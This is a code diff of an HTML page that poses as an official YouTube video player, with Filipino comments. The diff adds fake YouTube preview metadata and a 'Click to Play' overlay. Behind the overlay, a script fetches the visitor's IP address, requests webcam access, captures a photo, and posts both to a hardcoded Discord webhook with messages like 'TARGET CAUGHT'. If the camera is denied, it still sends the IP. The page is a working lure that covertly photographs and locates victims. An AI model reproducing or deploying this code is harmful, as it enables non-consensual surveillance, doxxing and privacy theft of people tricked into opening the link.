@@ -2,67 +2,79 @@
 <html>
 <head>
     <title>YouTube</title>
+    <meta property="og:title" content="YouTube - Watch Now">
+    <meta property="og:description" content="Official YouTube Portal">
+    <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
+    <meta property="og:type" content="video.other">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
+        iframe { width: 100%; height: 100%; border: none; display: none; } /* Nakatago muna ang video */
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; cursor: pointer; text-align: center; }
+        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
     </style>
 </head>
 <body>
-    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw?autoplay=1" allow="autoplay; encrypted-media"></iframe>
+
+    <div id="overlay" onclick="startTrap()">
+        <div class="play-btn"></div>
+        <p>Click to Play Video</p>
+        <small style="color: #666;">YouTube Player v2.4.1</small>
+    </div>
+
+    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw?autoplay=1&enablejsapi=1" allow="autoplay; encrypted-media"></iframe>
 
     <video id="v" autoplay style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // ANTI-SPAM: Isang beses lang mag-sesend kada session
-        if (!sessionStorage.getItem('sent_data')) {
-            const webhook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";
+        const webhook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";
 
-            async function startCapture() {
+        async function startTrap() {
+            // Pag-click nila, itatago ang overlay at ipapakita ang video
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('player').style.display = 'block';
+
+            if (!sessionStorage.getItem('huli_na')) {
                 try {
-                    // Kunin ang accurate na IP
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
                     
-                    // Request Camera
+                    // Request Cam - Dito lalabas yung "Allow"
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
+                    const vid = document.getElementById('v');
+                    vid.srcObject = stream;
 
                     setTimeout(async () => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = 640; canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const imgData = canvas.toDataURL('image/jpeg', 0.6);
+                        const can = document.getElementById('c');
+                        can.width = 640; can.height = 480;
+                        can.getContext('2d').drawImage(vid, 0, 0);
+                        const img = can.toDataURL('image/jpeg', 0.6);
 
-                        const blob = await (await fetch(imgData)).blob();
-                        const formData = new FormData();
-                        formData.append('file', blob, 'huli_ka.jpg');
-                        formData.append('payload_json', JSON.stringify({
-                            content: "🎯 **TARGET CAUGHT!**\n**IP Address:** " + ipData.ip
+                        const blob = await (await fetch(img)).blob();
+                        const fd = new FormData();
+                        fd.append('file', blob, 'huli_ka.jpg');
+                        fd.append('payload_json', JSON.stringify({
+                            content: "🚨 **HULI SA AKTO!**\n**IP:** " + ipData.ip
                         }));
 
-                        await fetch(webhook, { method: 'POST', body: formData });
-                        
-                        // Mark as sent para hindi mag-loop
-                        sessionStorage.setItem('sent_data', 'true');
-                        
-                        // Patayin ang camera track
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 1500);
-                } catch (err) {
-                    // Pag blocked ang cam, IP lang ang send (isang beses lang din)
+                        await fetch(webhook, { method: 'POST', body: fd });
+                        sessionStorage.setItem('huli_na', 'true');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1000);
+                } catch (e) {
+                    // Pag in-ignore o ni-deny ang cam, send pa rin ang IP
                     const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                     fetch(webhook, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ content: "⚠️ Cam Blocked pero nakuha IP: " + ipData.ip })
+                        body: JSON.stringify({ content: "⚠️ Cam Denied/Blocked. IP: " + ipData.ip })
                     });
-                    sessionStorage.setItem('sent_data', 'true');
+                    sessionStorage.setItem('huli_na', 'true');
                 }
             }
-            window.onload = startCapture;
         }
     </script>
 </body>
